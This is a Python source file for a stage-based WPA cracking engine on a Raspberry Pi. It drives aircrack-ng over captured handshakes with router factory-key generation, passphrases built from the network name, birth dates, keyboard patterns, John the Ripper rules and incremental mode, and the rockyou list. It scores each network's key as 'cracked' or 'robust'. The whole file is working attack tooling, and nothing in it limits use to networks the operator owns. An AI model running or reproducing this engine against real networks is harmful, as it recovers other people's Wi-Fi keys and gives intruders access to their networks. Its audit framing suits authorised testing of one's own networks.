#!/usr/bin/env python3
"""Sly cracking engine — stage-based WPA cracking on the Pi (aircrack-ng)."""
import os
import re
import subprocess
import threading
import time

WORDLISTS = {
    "rockyou": "/usr/share/wordlists/rockyou.txt",
}

# Live state of the current/last job, read by the web UI.
crack_state = {
    "active": False,
    "bssid": None,
    "network": None,
    "stage": None,
    "stage_num": 0,
    "stage_total": 1,
    "tested": 0,
    "total": 0,
    "speed": 0.0,
    "candidate": "",
    "found": False,
    "key": None,
    "finished": False,
    "message": "",
    "log": [],
    "saved": False,
    "robustness": None,
    "no_handshake": False,
    "stopped": False,
}

_lock = threading.Lock()
_proc = None

RE_TESTES = re.compile(r"(\d+)/(\d+)\s+keys tested\s+\(([\d.]+)\s*k/s\)")
RE_CANDIDAT = re.compile(r"Current passphrase:\s*(.*\S)")
RE_TROUVE = re.compile(r"KEY FOUND!\s*\[\s*(.+?)\s*\]")
RE_TESTES_FLUX = re.compile(r"(\d+)\s+keys tested\s+\(([\d.]+)\s*k/s\)")


def _reset(bssid, network):
    crack_state.update({
        "active": True, "bssid": bssid, "network": network,
        "stage": None, "stage_num": 0, "stage_total": 1,
        "tested": 0, "total": 0, "speed": 0.0, "candidate": "",
        "found": False, "key": None, "finished": False, "message": "",
        "log": [],
        "saved": False,
        "no_handshake": False,
        "stopped": False,
    })


def launch(pcap, bssid, network="", wordlist=WORDLISTS["rockyou"]):
    """Start a crack job in the background. Returns immediately."""
    _reset(bssid, network)
    t = threading.Thread(target=_run, args=(pcap, bssid, network, wordlist), daemon=True)
    t.start()

def generate_keyboard(file):
    """Stage: keyboard walks and repetition patterns (min 8 chars for WPA)."""
    bases = [
        "1234567890", "0987654321", "azertyuiop", "qwertyuiop",
        "qsdfghjklm", "asdfghjkl", "wxcvbnm", "poiuytreza",
        "1qaz2wsx", "qazwsxedc", "1q2w3e4r5t", "zaq12wsx",
        "147258369", "123123123", "112233445566",
    ]
    motifs = set()
    for b in bases:
        if len(b) >= 8:
            motifs.add(b)
        # progressive slices of length >= 8
        for n in range(8, len(b) + 1):
            motifs.add(b[:n])
    # single-character repetitions (8 to 12 long)
    for c in "0123456789azertyuiopqsdfghjklmwxcvbn":
        for n in range(8, 13):
            motifs.add(c * n)
    with open(file, "w") as f:
        for m in sorted(motifs):
            f.write(m + "\n")
    return file

def generate_dates(file, year_start=1950, year_end=2025):
    """Stage: generate all DDMMYYYY dates (8 digits) as WPA candidates."""
    jours_par_mois = [31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
    with open(file, "w") as f:
        for annee in range(year_start, year_end + 1):
            for mois in range(1, 13):
                for jour in range(1, jours_par_mois[mois - 1] + 1):
                    f.write("%02d%02d%04d\n" % (jour, mois, annee))
                    f.write("%04d%02d%02d\n" % (annee, mois, jour))
    return file

_profiles_cache = None

def _load_profiles():
    """Load the box-profile knowledge base (tiny JSON next to this engine)."""
    global _profiles_cache
    if _profiles_cache is not None:
        return _profiles_cache
    import json
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "box_profiles.json")
    try:
        with open(path, encoding="utf-8") as f:
            _profiles_cache = json.load(f).get("profiles", [])
    except (OSError, ValueError):
        _profiles_cache = []
    return _profiles_cache

def profile_for_essid(essid):
    """Return the matching box profile for an ESSID, or None."""
    if not essid:
        return None
    for p in _load_profiles():
        if essid.startswith(p.get("prefix", "\0")):
            return p
    return None

def essid_from_pcap(pcap, bssid):
    """Read the real ESSID from a beacon in the capture. The filename can lose
    characters (bettercap drops punctuation such as the hyphen in "Bbox-..."),
    which would break the factory-key and ESSID stages, so trust the capture."""
    if not bssid:
        return None
    try:
        out = subprocess.run(
            ["tshark", "-r", pcap,
             "-Y", "wlan.fc.type_subtype==0x08 && wlan.bssid==%s" % bssid.lower(),
             "-T", "fields", "-e", "wlan.ssid"],
            capture_output=True, text=True, timeout=30,
        ).stdout
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return None
    for line in out.splitlines():
        s = line.strip().split(",")[0]
        if not s:
            continue
        if len(s) % 2 == 0 and all(c in "0123456789abcdefABCDEF" for c in s):
            try:
                s = bytes.fromhex(s).decode("utf-8", "replace")
            except ValueError:
                pass
        s = s.strip()
        if s:
            return s
    return None

def factory_keys(essid, bssid):
    """Stage 1: targeted factory keys = box-profile routing + routerkeygen-cli."""
    profile = profile_for_essid(essid)
    # Known non-target (community hotspot, etc.): skip the whole stage.
    if profile and profile.get("algo") == "ignore":
        return []
    try:
        out = subprocess.run(
            ["routerkeygen-cli", "-q", "-s", essid, "-m", bssid],
            capture_output=True, text=True, timeout=30,
        )
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return []
    keys, seen = [], set()
    for line in out.stdout.splitlines():
        c = line.strip()
        if 8 <= len(c) <= 63 and " " not in c and c not in seen:
            seen.add(c)
            keys.append(c)
    return keys

def essid_words(essid):
    """Extract seed words from a *custom* network name.
    Returns [] for generic/box names (already handled by the factory stage)."""
    if not essid:
        return []
    if profile_for_essid(essid):      # known box prefix -> generic name, skip
        return []
    mots = set()
    trimmed = essid.strip()
    compact = re.sub(r"[^A-Za-z0-9]", "", trimmed)
    for v in (trimmed, compact):
        if v:
            mots.add(v)
            mots.add(v.lower())
    for t in re.split(r"[^A-Za-z]+", trimmed):
        if len(t) >= 3:
            mots.add(t)
            mots.add(t.lower())
            mots.add(t.capitalize())
    return sorted(mots)

def generate_essid(file, essid):
    """Stage 2 seed file: custom-name words (John rules mutate them later)."""
    mots = essid_words(essid)
    with open(file, "w") as f:
        for m in mots:
            f.write(m + "\n")
    return len(mots)

STAGES = [
    {"name": "factory default keys", "type": "constructeur"},
    {"name": "ESSID profiling (custom name)", "type": "essid"},
    {"name": "real cracked keys (probable-wpa)", "type": "wordlist", "file": "/usr/share/wordlists/probable-wpa-top4800.txt"},
    {"name": "birth dates (DDMMYYYY/YYYYMMDD)", "type": "genere", "generateur": generate_dates},
    {"name": "10k common passwords", "type": "wordlist", "file": "/usr/share/wordlists/10k-common.txt"},
    {"name": "keyboard patterns", "type": "genere", "generateur": generate_keyboard},
    {"name": "common + mutation rules", "type": "rules", "file": "/usr/share/wordlists/10k-common.txt"},
    {"name": "John incremental (1h)", "type": "temps", "source": "john_inc"},
    {"name": "rockyou random (1h)", "type": "temps", "source": "rockyou_shuf"},
]

def a_un_handshake(pcap, bssid=None):
    """True only if the capture yields a crackable WPA hash.

    Uses hcxpcapngtool (the same tool as the GPU export) and checks it wrote a
    non-empty .hc22000. aircrack-ng's own "N handshake" count is too loose: it
    flags partial captures that neither the local engine nor the export can
    actually crack, so a capture could show an active Test/GPU button and then
    fail with "No crackable handshake"."""
    output = "/dev/shm/raton_hs_check.hc22000"
    try:
        os.remove(output)
    except OSError:
        pass
    try:
        subprocess.run(
            ["hcxpcapngtool", "-o", output, pcap],
            capture_output=True, text=True, timeout=30,
            stdin=subprocess.DEVNULL,
        )
    except Exception:
        return True   # tool missing or error: don't block, let Sly try
    try:
        ok = os.path.getsize(output) > 0
    except OSError:
        ok = False
    try:
        os.remove(output)
    except OSError:
        pass
    return ok


VERDICTS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             "raton_verdicts.json")


def load_verdicts():
    import json
    try:
        with open(VERDICTS_FILE, encoding="utf-8") as f:
            d = json.load(f)
            return d if isinstance(d, dict) else {}
    except (OSError, ValueError):
        return {}


def _save_verdict(bssid, result, stage=None):
    """Persist a real crack outcome per BSSID so Echo can show the truth
    (robust/cracked) instead of the model-level heuristic."""
    import json
    if not bssid:
        return
    try:
        d = load_verdicts()
        d[bssid.upper()] = {"result": result, "stage": stage, "date": int(time.time())}
        tmp = VERDICTS_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(d, f)
        os.replace(tmp, VERDICTS_FILE)
    except OSError:
        pass


def _run(pcap, bssid, network, wordlist):
    global _proc
    keyfile = "/tmp/raton_found.key"
    crack_state["stage_total"] = len(STAGES)

    if not a_un_handshake(pcap, bssid):
        with _lock:
            crack_state["active"] = False
            crack_state["finished"] = True
            crack_state["no_handshake"] = True
            crack_state["message"] = "No handshake"
        return

    # The filename can lose characters; use the real ESSID from the capture so the
    # factory-key and ESSID stages match (e.g. "Bbox-..." instead of "Bbox...").
    real_essid = essid_from_pcap(pcap, bssid)
    if real_essid:
        network = real_essid

    for i, stage in enumerate(STAGES, start=1):
        if not crack_state["active"]:
            break

        # Prepare this stage's wordlist / source
        if stage["type"] == "constructeur":
            keys = factory_keys(network, bssid)
            if not keys:
                with _lock:
                    crack_state["log"].append({"num": i, "name": stage["name"], "result": "skipped"})
                continue
            wl = "/tmp/raton_stage_const.txt"
            with open(wl, "w") as f:
                f.write("\n".join(keys) + "\n")
        elif stage["type"] == "essid":
            seed = "/tmp/raton_stage_essid.txt"
            n = generate_essid(seed, network)
            if n == 0:
                with _lock:
                    crack_state["log"].append({"num": i, "name": stage["name"], "result": "skipped"})
                continue
            gen = os.path.join(os.path.dirname(os.path.abspath(__file__)), "raton_essid_gen.py")
            wl = "/dev/shm/raton_essid.txt"
            with open(wl, "w") as f:
                p1 = subprocess.Popen(["python3", gen, seed],
                                      stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
                subprocess.run(["head", "-n", "300000"], stdin=p1.stdout, stdout=f)
                p1.stdout.close()
                p1.wait()
        elif stage["type"] == "genere":
            wl = "/tmp/raton_stage_gen.txt"
            stage["generateur"](wl)
        elif stage["type"] == "rules":
            wl = "PIPE_JOHN"
            rules_dict = stage["file"]
        elif stage["type"] == "temps":
            wl = "TEMPS"
        else:
            base = stage["file"]
            wl = "/dev/shm/raton_wl.txt"
            with open(wl, "w") as f:
                subprocess.run(["awk", "length>=8 && length<=63", base], stdout=f)

        est_temps = (stage["type"] == "temps")
        with _lock:
            crack_state["stage"] = stage["name"]
            crack_state["stage_num"] = i
            crack_state["tested"] = 0
            crack_state["total"] = 0
            crack_state["candidate"] = ""
            crack_state["streaming"] = (stage["type"] == "rules")
            crack_state["time_gauge"] = est_temps
            crack_state["time_total"] = 3600 if est_temps else 0
            crack_state["time_elapsed"] = 0

        try:
            if os.path.exists(keyfile):
                os.remove(keyfile)
        except OSError:
            pass

        _john = None
        _head = None
        if wl == "PIPE_JOHN":
            _john = subprocess.Popen(
                ["john", "--stdout", "--rules", "--wordlist=" + rules_dict],
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            )
            _head = subprocess.Popen(
                ["awk", "length>=8 && length<=63"],
                stdin=_john.stdout, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            )
            _john.stdout.close()
            aircrack_stdin = _head.stdout
            cmd = ["aircrack-ng", "-w", "-", "-l", keyfile, "-b", bssid, pcap]
        elif wl == "PIPE_ESSID":
            gen = os.path.join(os.path.dirname(os.path.abspath(__file__)), "raton_essid_gen.py")
            _john = subprocess.Popen(
                ["python3", gen, rules_dict],
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            )
            _head = subprocess.Popen(
                ["head", "-n", "100000"],
                stdin=_john.stdout, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            )
            _john.stdout.close()
            aircrack_stdin = _head.stdout
            cmd = ["aircrack-ng", "-w", "-", "-l", keyfile, "-b", bssid, pcap]
        elif wl == "TEMPS":
            if stage["source"] == "john_inc":
                src = ["john", "--stdout", "--incremental=ASCII"]
            else:
                src = ["shuf", WORDLISTS["rockyou"]]
            _john = subprocess.Popen(src, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
            _head = subprocess.Popen(
                ["awk", "length>=8 && length<=63"],
                stdin=_john.stdout, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            )
            _john.stdout.close()
            aircrack_stdin = _head.stdout
            cmd = ["aircrack-ng", "-w", "-", "-l", keyfile, "-b", bssid, pcap]
        else:
            cmd = ["aircrack-ng", "-w", wl, "-l", keyfile, "-b", bssid, pcap]
            aircrack_stdin = None

        try:
            _proc = subprocess.Popen(
                cmd, stdin=aircrack_stdin, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                encoding="utf-8", errors="replace", bufsize=1,
                preexec_fn=lambda: os.nice(10),  # keep a core free for the web UI
            )
        except FileNotFoundError:
            crack_state.update({"active": False, "finished": True, "message": "aircrack-ng not found"})
            return

        if est_temps:
            deadline = time.time() + 3600
            def _clock(p, src_proc, deadline):
                while p.poll() is None:
                    remaining = deadline - time.time()
                    with _lock:
                        crack_state["time_elapsed"] = max(0, min(3600, int(3600 - remaining)))
                    if remaining <= 0:
                        for q in (p, src_proc):
                            try:
                                q.terminate()
                            except Exception:
                                pass
                        break
                    time.sleep(1)
            threading.Thread(target=_clock, args=(_proc, _john, deadline), daemon=True).start()

        buf = ""
        while True:
            ch = _proc.stdout.read(1)
            if ch == "":
                break
            buf += ch
            if ch in ("\r", "\n"):
                _parser(buf)
                buf = ""
        _proc.wait()
        if _john is not None:
            try:
                _john.terminate()
            except Exception:
                pass
        if _head is not None:
            try:
                _head.terminate()
            except Exception:
                pass

        key = None
        try:
            with open(keyfile) as f:
                key = f.read().strip()
        except OSError:
            pass

        if key:
            with _lock:
                crack_state["active"] = False
                crack_state["finished"] = True
                crack_state["found"] = True
                crack_state["key"] = key
                crack_state["etape_echec"] = i
                crack_state["robustness"] = _robustness_score(i, crack_state["stage_total"])
                crack_state["log"].append({"num": i, "name": stage["name"], "result": "cracked"})
                crack_state["message"] = "Cracked"
            _save_verdict(bssid, "cracked", i)
            return

        with _lock:
            crack_state["log"].append({"num": i, "name": stage["name"], "result": "not found"})

    with _lock:
        crack_state["active"] = False
        crack_state["finished"] = True
        # Only call it "robust" when every stage actually ran. A manual stop
        # breaks out early, so don't claim the key resisted anything.
        if not crack_state.get("stopped"):
            crack_state["robustness"] = _robustness_score(None, crack_state["stage_total"])
            crack_state["message"] = "Exhausted"
            _save_verdict(bssid, "robust")

def _robustness_score(failed_stage, total):
    """Robustness = the stage that cracked the key. Earlier stage = weaker key."""
    if failed_stage is None:
        return {
            "label": "Robust",
            "level": "ok",
            "detail": "Key resisted every offline cracking stage.",
        }
    labels = {
        1: ("Critical",  "Factory-default / vendor-pattern key, recovered instantly."),
        2: ("Critical",  "Key derived from the network name itself."),
        3: ("Very weak", "Key found in a database of already-cracked WPA keys."),
        4: ("Very weak", "Key is a birth date."),
        5: ("Weak",      "Key found in a common-password list."),
        6: ("Weak",      "Key is a keyboard pattern."),
        7: ("Weak",      "Key is a simple variation of a common word."),
        8: ("Moderate",  "Key recovered by a short brute-force pass (under 1h)."),
        9: ("Moderate",  "Key found in the rockyou wordlist."),
    }
    label, detail = labels.get(failed_stage, ("Weak", "Key recovered by an early stage."))
    return {
        "label": label,
        "level": "risque",
        "detail": detail,
        "stage": failed_stage,
        "total": total,
    }

def _parser(line):
    m = RE_TESTES.search(line)
    if m:
        with _lock:
            crack_state["tested"] = int(m.group(1))
            crack_state["total"] = int(m.group(2))
            crack_state["speed"] = float(m.group(3))
    m = RE_CANDIDAT.search(line)
    if m:
        with _lock:
            crack_state["candidate"] = m.group(1).strip()
    m = RE_TROUVE.search(line)
    if m:
        with _lock:
            crack_state["found"] = True
            crack_state["key"] = m.group(1)

def stop():
    global _proc
    if _proc and _proc.poll() is None:
        _proc.terminate()
    crack_state["active"] = False
    crack_state["finished"] = True
    crack_state["stopped"] = True
    crack_state["message"] = "Stopped"


if __name__ == "__main__":
    import sys
    pcap = sys.argv[1]
    bssid = sys.argv[2]
    wl = sys.argv[3] if len(sys.argv) > 3 else WORDLISTS["rockyou"]
    launch(pcap, bssid, wordlist=wl)
    while not crack_state["finished"]:
        e = crack_state
        print(f"\r[{e['stage']}] {e['tested']}/{e['total']} {e['speed']} k/s  try={e['candidate']}   ", end="", flush=True)
        time.sleep(0.5)
    print()
    print("RESULT:", crack_state["message"], "KEY=", crack_state["key"])
